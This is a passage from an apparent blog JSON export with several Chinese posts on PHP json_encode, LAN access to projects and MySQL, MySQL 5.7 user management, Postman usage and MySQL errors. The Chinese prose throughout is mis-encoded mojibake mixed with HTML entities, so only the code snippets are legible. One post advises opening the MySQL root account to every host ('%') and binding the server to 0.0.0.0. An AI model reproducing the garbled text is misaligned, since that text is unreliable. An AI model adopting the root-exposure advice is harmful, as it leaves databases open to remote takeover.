&quot;å¤šç»´æ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;å¤šç»´æ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);echo &quot;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($d), &quot;\\n&quot;; &#x2F;&#x2F;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;echo &quot;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;$arr &#x3D; array( &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;gender&quot; &#x3D;&gt; &quot;men&quot;, &quot;age&quot; &#x3D;&gt; 22);$res &#x3D; json_encode($arr);var_dump($res);echo($res);string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"åŒä¸€å±€åŸŸç½‘å†…å¦‚ä½•è®¿é—®é¡¹ç›®åœ°å€ã€è¿æ¥ Mysql","slug":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network","date":"2020-09-21T13:42:44.000Z","updated":"2020-09-23T14:46:39.880Z","comments":true,"path":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","excerpt":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œåœ¨å›¢é˜Ÿé¡¹ç›®å¼€å‘ä¸­è¿™æ˜¯ä¸¤ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œåœ¨å›¢é˜Ÿé¡¹ç›®å¼€å‘ä¸­è¿™æ˜¯ä¸¤ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚ å±€åŸŸç½‘å†…å…±äº«é¡¹ç›®åœ°å€æœ‰æ—¶å€™ä¼šæœ‰è¿™æ ·ä¸€ç§éœ€æ±‚ï¼Œè‡ªå·±åœ¨æœ¬åœ°é¡¹ç›®åšå¼€å‘ï¼Œè¿˜æ²¡æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å…¶ä»–äººå¸Œæœ›èƒ½åœ¨ä»–çš„ç”µè„‘ä¸Šè®¿é—®é¡¹ç›®ã€‚ è¿™ä¸ªæ—¶å€™å°±éœ€è¦è¿™ä¸¤å°ç”µè„‘åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œä¹Ÿå°±æ˜¯è¿æ¥ç›¸åŒçš„WiFi ã€‚ ç„¶åæŸ¥çœ‹è‡ªå·±çš„å¤–ç½‘IP åœ°å€æ˜¯å¤šå°‘ï¼š 12345# mac&#x2F;linuxifconfig# windowsipconfig å¤–ç½‘IP åœ°å€é€šå¸¸æ˜¯ä»¥192.168.x.xxxæ‰“å¤´çš„IP ï¼Œç„¶åæŠŠè¿™ä¸ªIP é…ç½®åˆ°å¯¹åº”çš„åŸŸåã€‚ 123456789# mac&#x2F;linuxvim &#x2F;usr&#x2F;etc&#x2F;hosts# windowsC:\\Windows\\ System32 \\drivers\\etc\\hosts# hosts 127.0.0.1 example.com192.168.x.xxx example.com é…ç½®å®Œæˆä¹‹åï¼Œç›´æ¥æŠŠexample.comè¿™ä¸ªåŸŸåä¸¢ç»™å¯¹æ–¹ï¼Œå¯¹æ–¹å°±åœ¨ä»–è‡ªå·±çš„ç”µè„‘ä¸Šå¯ä»¥è®¿é—®äº†ã€‚ å±€åŸŸç½‘å†…è¿æ¥Mysqlæƒ³è¦åœ¨å±€åŸŸç½‘å†…ï¼Œè®©åˆ«äººèƒ½è¿æ¥åˆ°æˆ‘çš„æ•°æ®åº“ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š å¯¹æœ¬åœ°Mysql æˆæƒï¼Œå…è®¸å…¶ä»–ç”¨æˆ·è¿æ¥ Mysql å¼€æ”¾å¤–ç½‘è®¿é—® å¯¹äºç¬¬ä¸€ç‚¹ï¼Œå¯ä»¥ä»¥ä¸‹å‘½ä»¤æ¥å®Œæˆï¼š 123451. mysql -hlocalhost -uroot -p;2. use mysql;# ä¿®æ”¹æƒé™ï¼Œå…è®¸å…¶ä»–äººè¿æ¥ï¼š3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;4. flush privileges; é€šå¸¸å®Œæˆç¬¬ä¸€æ­¥ï¼Œå°±å¯ä»¥è¿æ¥äº†ï¼Œå¦‚æœè¿æ¥å¼‚å¸¸ï¼Œå¯ä»¥å°è¯•ç¬¬äºŒæ­¥ï¼š 12345# æ‰“å¼€Mysql é…ç½®æ–‡ä»¶vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnfbind-address &#x3D; 0.0.0.0# 127.0.0.1 æ›¿æ¢æˆ 0.0.0.0; ç„¶åé‡å¯Mysql æ•°æ®åº“å³å¯ã€‚ å…¶ä»–äººæ€ä¹ˆè¿æ¥æˆ‘çš„æ•°æ®åº“ï¼Ÿ æŠŠè¿™ä¸ªä¸¢ç»™ä»–ï¼š 123hostï¼šä½ çš„å¤–ç½‘IP åœ°å€userï¼šä½ çš„Mysql ç”¨æˆ·pwdï¼šä½ çš„Mysql å¯†ç ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"å±€åŸŸç½‘","slug":"å±€åŸŸç½‘","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"mysql5.7ç”¨æˆ·ç®¡ç†ï¼šæ·»åŠ ç”¨æˆ·ã€æˆæƒã€æ’¤æƒã€ä¿®æ”¹å¯†ç ","slug":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords","date":"2020-09-20T15:42:13.000Z","updated":"2020-09-20T15:43:47.158Z","comments":true,"path":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","link":"","permalink":"https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","excerpt":"å› ä¸ºMysql 5.7 æ˜¯ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ•°æ®åº“ï¼Œè€Œ5.7 åœ¨æŸäº›åœ°æ–¹åˆå’Œå…¶ä»–ç‰ˆæœ¬æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ã€‚","text":"å› ä¸ºMysql 5.7 æ˜¯ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ•°æ®åº“ï¼Œè€Œ5.7 åœ¨æŸäº›åœ°æ–¹åˆå’Œå…¶ä»–ç‰ˆæœ¬æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ã€‚ åˆ›å»ºç”¨æˆ·123# è¯­æ³•ï¼šCREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;mysql&gt; CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;; host å‚æ•°è¯´æ˜ï¼š %ï¼šåŒ¹é…æ‰€æœ‰ä¸»æœº localhostï¼šå½“å‰ä¸»æœºï¼Œlocalhost ä¸ä¼šè¢«è§£ææˆIPåœ°å€ï¼Œè€Œæ˜¯é€šè¿‡UNIXsocket è¿æ¥ 127.0.0.1ï¼šå½“å‰ä¸»æœºï¼Œé€šè¿‡TCP/IP åè®®è¿æ¥ ::1ï¼šå½“å‰ä¸»æœºï¼Œå…¼å®¹æ”¯æŒipv6 æ­¤æ—¶è¿˜æ²¡æœ‰æˆæƒï¼Œåªèƒ½ç™»é™†ï¼Œæ— æ³•åšå…¶ä½™æ“ä½œ ç”¨æˆ·æˆæƒ1234567891011121314# åˆ›å»ºå®Œæˆä¹‹åæˆæƒmysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;# åˆ›å»ºç”¨æˆ·åŒæ—¶æˆæƒmysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;# åˆ·æ–°æƒé™mysql&gt; flush privileges;# æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰æƒé™mysql&gt; show grants for dev@&#39;%&#39;;# æ’¤æ¶ˆç”¨æˆ·æˆæƒï¼Œæ’¤æ¶ˆè¦æ±‚å„å‚æ•°ä¸æˆæƒæ—¶ä½¿ç”¨çš„ä¸€è‡´ï¼Œå¯ä»¥å…ˆæŸ¥çœ‹æˆæƒå†æ’¤æ¶ˆmysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;; privileges å‚æ•°è¯´æ˜ï¼š all privileges: æ‰€æœ‰æƒé™ï¼› select: æŸ¥è¯¢ï¼› insert: æ–°å¢è®°å½•; update: æ›´æ–°è®°å½•ï¼› delete: åˆ é™¤è®°å½•ï¼› create: åˆ›å»ºè¡¨ï¼› drop: åˆ é™¤è¡¨ï¼› alter: ä¿®æ”¹è¡¨ç»“æ„ï¼› index: ç´¢å¼•ç›¸å…³æƒé™ï¼› execute: æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ä¸callå‡½æ•° referencesï¼š å¤–é”®ç›¸å…³ï¼› create temporary tablesï¼šåˆ›å»ºä¸´æ—¶è¡¨ï¼› lock tablesï¼šé”è¡¨ï¼› create viewï¼šåˆ›å»ºè§†å›¾ï¼› show viewï¼šæŸ¥çœ‹è§†å›¾ç»“æ„ï¼› trigger: è§¦å‘å™¨ï¼› dbName å¯ä»¥æ˜¯æŸä¸ªåº“ï¼ˆdatabaseï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯å…·ä½“åˆ°æŸå¼ è¡¨ï¼ˆdatabase.tableï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯æ‰€æ•´ä¸ªæ•°æ®åº“ï¼ˆ*ï¼‰ã€‚ ä¿®æ”¹å¯†ç 1234567891011121314# ä¿®æ”¹è‡ªå·±çš„å¯†ç mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•1mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•2: é€‚ç”¨mysql5.7ä»¥å‰çš„ç‰ˆæœ¬ï¼Œ5.7ä»¥åçš„ç‰ˆæœ¬ä¸­mysql.userè¡¨æ²¡æœ‰äº†passwordå­—æ®µmysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•3ï¼šé€‚ç”¨mysql5.7mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•4mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;; åˆ é™¤ç”¨æˆ·1mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;; ä¸å»ºè®®ç›´æ¥é€šè¿‡ä¿®æ”¹mysql.userè¡¨å»æ“ä½œç”¨æˆ·ã€‚ å‚è€ƒé“¾æ¥ mysql5.7ç”¨æˆ·ç®¡ç†ï¼šæ·»åŠ ç”¨æˆ·ã€æˆæƒã€æ’¤æƒã€ä¿®æ”¹å¯†ç ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Postman ä½¿ç”¨æŠ€å·§æ•´ç†","slug":"postman-tips","date":"2020-09-19T12:58:16.000Z","updated":"2020-10-30T00:22:26.807Z","comments":true,"path":"postman-tips/","link":"","permalink":"https://www.0x2beace.com/postman-tips/","excerpt":"Postman ä½œä¸ºhttp è¯·æ±‚å·¥å…·ï¼Œæ— è®ºæ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•æ‰€ä½¿ç”¨çš„é¢‘ç‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„ä½¿ç”¨æŠ€å·§ã€‚","text":"Postman ä½œä¸ºhttp è¯·æ±‚å·¥å…·ï¼Œæ— è®ºæ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•æ‰€ä½¿ç”¨çš„é¢‘ç‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„ä½¿ç”¨æŠ€å·§ã€‚ å‘é€è¡¨å•æäº¤è¿™é‡Œçš„è¡¨å•æäº¤å°±æ˜¯æŒ‡ä¼ ç»Ÿçš„è¡¨å•æäº¤ã€‚ æ ¸å¿ƒè¯·æ±‚å¤´ä¿¡æ¯ï¼š 12Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;Content-Type: application&#x2F;x-www-form-urlencoded body çš„æ•°æ®æ ¼å¼é€‰æ‹©form-dataã€‚ å‘é€Ajax è¯·æ±‚æ ¸å¿ƒè¯·æ±‚å¤´ä¿¡æ¯ï¼š 123Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequest body çš„æ•°æ®æ ¼å¼é€‰æ‹© x-www-form-urlencodeï¼Œå¦‚æœé€‰æ‹©form-dataåˆ™æ¥æ”¶åˆ°çš„æ•°æ®æ ¼å¼ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š å¦‚æœä»¥x-www-form-urlencodeæ ¼å¼è¿›è¡Œæäº¤ï¼Œé‚£ä¹ˆæ¥æ”¶åˆ°çš„æ•°æ®æ˜¯è¿™ä¸ªæ ·å­ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡é­”æœ¯å˜é‡è·å–ä½¿ç”¨ã€‚ å¦‚ä½•æŠŠè¯·æ±‚å‚æ•°ä½œä¸ºjson æ ¼å¼è¿›è¡Œæäº¤ï¼Ÿåœ¨Bodyä¸­ï¼Œé€‰æ‹©raw ç„¶åæŠŠè¯·æ±‚å‚æ•°ä»¥json çš„æ ¼å¼å¡«è¿›å»ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œä»¥json æ ¼å¼æäº¤çš„è¯·æ±‚ï¼Œç”¨å¸¸è§çš„é­”æœ¯å˜é‡è·å–ä¸åˆ°ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ï¼š 1json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); æäº¤æ–‡ä»¶æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¯ä»¥æµ‹è¯•æ–‡ä»¶æäº¤ï¼Œä½¿ç”¨ Postman å½“ç„¶ä¹Ÿå¯ä»¥å®Œæˆã€‚ è¯·æ±‚æ–¹å¼é€‰æ‹©POSTï¼ŒHeaders å¯ä»¥ä¸ç”¨åšé€‰æ‹©ï¼ŒBody é€‰æ‹© form-dataï¼Œç±»å‹ç”±é»˜è®¤çš„text æ”¹æˆ fileï¼Œç„¶åé€‰æ‹©éœ€è¦æäº¤çš„æ–‡ä»¶å³å¯ã€‚ æ³¨æ„ï¼škey æœ€å¥½ä¹Ÿå¡«ä¸Š file è¿™ä¸ªå…³é”®å­—ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"}]},{"title":"Mysql å¸¸è§å¼‚å¸¸åˆ†æ","slug":"mysql-common-exception-analysis","date":"2020-09-17T12:52:29.000Z","updated":"2020-09-17T12:57:42.663Z","comments":true,"path":"mysql-common-exception-analysis/","link":"","permalink":"https://www.0x2beace.com/mysql-common-exception-analysis/","excerpt":"æœ¬æ–‡ç”¨æ¥æ•´ç† Mysql ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚","text":"æœ¬æ–‡ç”¨æ¥æ•´ç† Mysql ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚ Mysql æ— æ³•æ­£å¸¸å¯åŠ¨å¼‚å¸¸æè¿°ï¼šMysql Server æ— æ³•æ­£å¸¸å¯åŠ¨ï¼ŒClient è¿æ¥Mysql å¼‚å¸¸å¦‚ä¸‹ï¼š ERROR 2002 (HY000): Canâ€™t connect to local MySQL server through socket â€˜/var/run/mysqld/mysqld.sockâ€™ (2) é¦–å…ˆï¼Œè¿™ä¸ªé”™è¯¯æ„å‘³ç€ /var/run/mysqld/mysqld.sock ä¸å­˜åœ¨ï¼Œè€Œè¯¥æ–‡ä»¶ä¹‹æ‰€ä»¥ä¸å­˜åœ¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰å®‰è£… mysql-serverï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºè¯¥æ–‡ä»¶è¢«ç§»åŠ¨äº†ã€‚ å¦‚æœæ˜¯éœ€è¦è¿æ¥æœ¬æœºçš„Mysqlï¼ˆmysql -hlocalhost -uroot -pï¼‰ï¼Œé‚£ä¹ˆéœ€è¦å…ˆå®‰è£… mysql serverï¼š 1apt-get install mysql-server -y å¦‚æœMysql æœåŠ¡ç¡®å®æœ‰åœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£ä¹ˆè¯·æ£€æŸ¥/etc/mysql/mysql.conf.d/mysqld.cnf é…ç½®æ–‡ä»¶ï¼Œæ˜¯å¦å­˜åœ¨ä»¥ä¸‹é…ç½®ï¼š 1socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock å¦‚æœåªæ˜¯éœ€è¦è¿æ¥å…¶ä»–ä¸»æœºï¼Œé‚£ä¹ˆåœ¨æœ¬æœºä¸Šä¸å®‰è£… Mysql Server ä¹Ÿå¯ä»¥ï¼Œä½†éœ€è¦ä¿è¯â€œå…¶ä»–ä¸»æœºâ€çš„Mysql å·²ç»æ­£å¸¸å¯åŠ¨ã€‚ 1mysql -h&lt;hostname&gt; -uroot -p æ€»ç»“ï¼šæœ€æœ‰å¯èƒ½çš„æƒ…å†µæ˜¯éœ€è¦è¿æ¥çš„Mysql æœåŠ¡æ ¹æœ¬æ²¡æœ‰å¯åŠ¨ï¼Œè¦ä¹ˆæ²¡æœ‰åœ¨ä¸ä»ç»ˆç«¯è¿è¡ŒMySQLå®¢æˆ·ç«¯çš„ä¸»æœºç›¸åŒçš„ä¸»æœºä¸Šè¿è¡Œï¼Œå°æ¦‚ç‡æ˜¯å› ä¸ºé…ç½®æ–‡ä»¶é”™è¯¯å¯¼è‡´ã€‚ Mysql ç”¨æˆ·éªŒè¯å¤±è´¥å¼‚å¸¸æè¿°ï¼šMysql åˆ›å»ºå®Œè¯¥ç”¨æˆ·ä¹‹åï¼Œèµ‹äºˆæƒé™å¹¶è®¾ç½®å¯†ç ï¼Œä½†æ˜¯æ€»æ˜¯ä¼šæç¤ºå¦‚ä¸‹å¼‚å¸¸ï¼š ERROR 1045 (28000): Access denied for user â€˜zabbixâ€™@â€™172.17.0.1â€™ (using password: YES) å‡ºç°è¯¥å¼‚å¸¸ä¿¡æ¯å¯èƒ½æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š ç”¨æˆ·åå¯†ç é”™è¯¯ è¯¥ç”¨æˆ·æƒé™ä¸è¶³ Mysql æ–­å¼€è¿æ¥å¼‚å¸¸æè¿°ï¼šMysql å¶å°”ä¼šè‡ªå·±æ–­å¼€è¿æ¥ï¼Œç„¶åå¿…é¡»é‡å¯Mysql æœåŠ¡æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚ ERROR 2013 (HY000): Lost connection to MySQL server at â€˜reading initial communication packetâ€™, system error: 102 ç›®å‰å¹¶æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„è§£å†³æ–¹æ¡ˆï¼Œä¸è¿‡èƒ½å¤§è‡´ç¡®å®šä»¥ä¸‹å‡ ä¸ªæ–¹å‘ï¼š åå‘DNS è§£æï¼Œé¿å…ä½¿ç”¨localhost å…è®¸ä½¿ç”¨æ‰€æœ‰è¿æ¥ï¼Ÿ localhost å¯¹åº”socketï¼Ÿ127.0.0.1 å¯¹åº” TCP/IPï¼Ÿ å‚è€ƒé“¾æ¥ é”™è¯¯2002(HY000)ï¼šæ— æ³•é€šè¿‡Socketâ€˜/var/run/mysqld/mysqld.sockâ€™è¿æ¥åˆ°æœ¬åœ°MySQLæœåŠ¡å™¨(2) ERROR 2013 (HY000): Lost connection to MySQL server at â€˜reading authorization packetâ€™, system error: 0","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql æ•°æ®åº“è®¾è®¡è§„èŒƒä¸åŸåˆ™","slug":"mysql-database-design-rules-and-principles","date":"2020-09-16T12:48:21.000Z","updated":"2020-09-16T12:51:01.020Z","comments":true,"path":"mysql-database-design-rules-and-principles/","link":"","permalink":"https://www.0x2beace.com/mysql-database-design-rules-and-principles/","excerpt":"æœ€è¿‘éœ€è¦æ ¹æ®ä¸šåŠ¡éœ€æ±‚é‡æ–°è®¾è®¡ä¸€å¥—å®Œæ•´çš„æ•°æ®åº“ï¼Œè®°å½•ä¸€ä¸‹è§„èŒƒçš„æ•°æ®åº“è®¾è®¡åŸåˆ™ã€‚","text":"æœ€è¿‘éœ€è¦æ ¹æ®ä¸šåŠ¡éœ€æ±‚é‡æ–°è®¾è®¡ä¸€å¥—å®Œæ•´çš„æ•°æ®åº“ï¼Œè®°å½•ä¸€ä¸‹è§„èŒƒçš„æ•°æ®åº“è®¾è®¡åŸåˆ™ã€‚ 1ã€æ•°æ®åº“å‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¯ä»¥é‡‡ç”¨å­—æ¯ + æ•°å­—è¿›è¡Œç»„åˆï¼Œå¤šä¸ªå•è¯å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ _ è¿›è¡Œåˆ†å‰²ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®è¡¨å‘½åç”¨å•æ•°ï¼Œå­—æ®µå‘½åä¹Ÿç”¨å•æ•° æ•°æ®åº“é‡Œé¢çš„å¯†ç ä¸€å®šè¦åŠ å¯†ï¼Œä¸èƒ½ä¿å­˜æ˜æ–‡ Mysql å¼•æ“ç±»å‹ç»Ÿä¸€ä½¿ç”¨ InnoDBï¼Œå­—ç¬¦ç¼–ç ç»Ÿä¸€ä½¿ç”¨ UTF-8 2ã€æ•°æ®åº“è¡¨åå‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¯ä»¥é‡‡ç”¨å­—æ¯ + æ•°å­—è¿›è¡Œç»„åˆï¼Œå¤šä¸ªå•è¯å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ _ è¿›è¡Œåˆ†å‰²ã€‚ å¯ä»¥åˆç†å¢åŠ è¡¨å‰ç¼€ï¼Œæœ‰æ•ˆåŒºåˆ†ä¸åŒç±»å‹çš„æ•°æ®è¡¨ 3ã€æ•°æ®åº“è¡¨å­—æ®µåå‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¤šä¸ªå•è¯ä½¿ç”¨ä¸‹åˆ’çº¿_è¿›è¡Œåˆ†å‰²ï¼ˆç»Ÿä¸€ä½¿ç”¨å°å†™ï¼‰ é¿å…ä½¿ç”¨è‡ªå®šä¹‰ç¼©å†™ï¼Œå¦‚ï¼šdate =&gt; dt è¡¨ä¸è¡¨ä¹‹é—´çš„ç›¸å…³è”å­—æ®µåç§°è¦æ±‚å°½å¯èƒ½çš„ç›¸åŒ æ¯ä¸ªå­—æ®µå°½é‡å¤‡æ³¨å…¶å«ä¹‰ 4ã€æ•°æ®åº“è¡¨å­—æ®µç±»å‹è§„èŒƒ æœ€å¥½ç»™æ¯ä¸ªå­—æ®µä¸€ä¸ªé»˜è®¤å€¼ï¼Œé¿å…ä½¿ç”¨ NULLã€‚å­—ç¬¦å‹é»˜è®¤å€¼ä¸ºä¸€ä¸ªç©ºå­—ç¬¦å€¼ä¸²ï¼Œæ•°å€¼å‹çš„é»˜è®¤å€¼ä¸ºæ•°å€¼0ï¼Œé€»è¾‘å‹çš„é»˜è®¤å€¼ä¸ºæ•°å€¼0 ç”¨å°½é‡å°‘çš„å­˜å‚¨ç©ºé—´æ¥å­˜å‚¨ä¸€ä¸ªå­—æ®µçš„æ•°æ® èƒ½ç”¨ tinyint å°±ä¸ç”¨ intï¼Œèƒ½ç”¨ int å°±ä¸è¦ç”¨ varcharï¼Œèƒ½ç”¨ varchar(16)å°±ä¸è¦ç”¨ varchar(225) boolean ç±»å‹çš„å‘½åç»Ÿä¸€ä½¿ç”¨is_xxxæ ¼å¼ 5ã€æ•°æ®åº“è¡¨ç´¢å¼•è§„èŒƒ ä¸ºæ¯ä¸ªè¡¨åˆ›å»ºä¸€ä¸ªä¸»é”®ç´¢å¼•; ä¸ºæ¯ä¸ªè¡¨åˆ›å»ºåˆç†çš„æ™®é€šç´¢å¼•; ä¸€äº›æ³¨æ„äº‹é¡¹ é¿å…ä½¿ç”¨NULLå­—æ®µ(NULLå­—æ®µå¾ˆéš¾æŸ¥è¯¢ä¼˜åŒ–ã€NULLå­—æ®µçš„ç´¢å¼•éœ€è¦é¢å¤–ç©ºé—´ã€NULLå­—æ®µçš„å¤åˆç´¢å¼•æ— æ•ˆ) é¿å…ä½¿ç”¨ count(*) é¿å…ä½¿ç”¨ select * å‚è€ƒé“¾æ¥ MYSQLæ•°æ®åº“è®¾è®¡è§„èŒƒä¸åŸåˆ™ æ•°æ®åº“è®¾è®¡åŸåˆ™ æ•°æ®åº“è¡¨åå­—æ®µå‘½åè§„èŒƒ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windowsã€Mac ä¸‹ä½¿ç”¨ PHPStorm é…ç½® Xdebugï¼Œå®ç°æ–­ç‚¹è°ƒè¯•","slug":"use-phpstorm-to-configure-xdebug-under-windows-and-mac","date":"2020-09-15T13:15:36.000Z","updated":"2020-09-15T13:21:21.882Z","comments":true,"path":"use-phpstorm-to-configure-xdebug-under-windows-and-mac/","link":"","permalink":"https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/","excerpt":"æ­å»ºè¿‡å¾ˆå¤šæ¬¡å¼€å‘ç¯å¢ƒäº†ï¼Œä½†æ¯æ¬¡åœ¨è°ƒè¯•è¿™ä¸€å—è¿˜æ˜¯ä¼šå¤šå°‘è€—è´¹ä¸€ç‚¹æ—¶é—´ã€‚æ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡å…³äºPHPSTORMè°ƒè¯•çš„ç¬”è®°ã€‚","text":"æ­å»ºè¿‡å¾ˆå¤šæ¬¡å¼€å‘ç¯å¢ƒäº†ï¼Œä½†æ¯æ¬¡åœ¨è°ƒè¯•è¿™ä¸€å—è¿˜æ˜¯ä¼šå¤šå°‘è€—è´¹ä¸€ç‚¹æ—¶é—´ã€‚æ‰€ä»¥ä